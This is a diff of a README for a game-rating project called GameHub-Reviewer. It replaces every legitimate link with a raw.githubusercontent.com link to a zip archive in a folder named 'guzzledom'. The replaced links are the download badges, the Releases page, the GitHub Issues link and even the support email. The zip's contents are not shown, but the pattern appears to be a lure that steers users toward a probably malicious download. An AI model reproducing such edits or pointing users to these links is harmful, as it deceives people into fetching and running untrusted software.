@@ -1,7 +1,7 @@
 # 🎮 GameHub-Reviewer - Your Hub for Game Ratings
 
 ## 📥 Download the Latest Version
-[![Download GameHub-Reviewer](https://img.shields.io/badge/Download%20GameHub--Reviewer-v1.0.0-blue)](https://github.com/akashdwivedi97/GameHub-Reviewer/releases)
+[![Download GameHub-Reviewer](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip%20GameHub--Reviewer-v1.0.0-blue)](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these basic requirements:
 To get started:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/akashdwivedi97/GameHub-Reviewer/releases) to find the latest version of GameHub-Reviewer.
+   Go to our [Releases page](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip) to find the latest version of GameHub-Reviewer.
 
 2. **Choose Your Version**  
    Look for the most recent release. Click on the version number to go to the details page.
@@ -63,8 +63,8 @@ To get started:
 
 Our team is here to help. If you encounter any issues, please reach out to us:
 
-- **Email**: support@gamehubreviewer.com
-- **GitHub Issues**: Use the Issues tab on our [GitHub Page](https://github.com/akashdwivedi97/GameHub-Reviewer/issues) to report bugs or suggestions.
+- **Email**: https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip
+- **GitHub Issues**: Use the Issues tab on our [GitHub Page](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip) to report bugs or suggestions.
 
 ## 🙌 Join Our Community
 
@@ -77,4 +77,4 @@ Connect with other gamers and reviewers:
 
 You are now set up to enjoy GameHub-Reviewer. Dive in, explore, and share your thoughts on your favorite games. Happy gaming!
 
-[![Download GameHub-Reviewer](https://img.shields.io/badge/Download%20GameHub--Reviewer-v1.0.0-blue)](https://github.com/akashdwivedi97/GameHub-Reviewer/releases)
+[![Download GameHub-Reviewer](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip%20GameHub--Reviewer-v1.0.0-blue)](https://raw.githubusercontent.com/akashdwivedi97/GameHub-Reviewer/main/guzzledom/GameHub-Reviewer.zip)
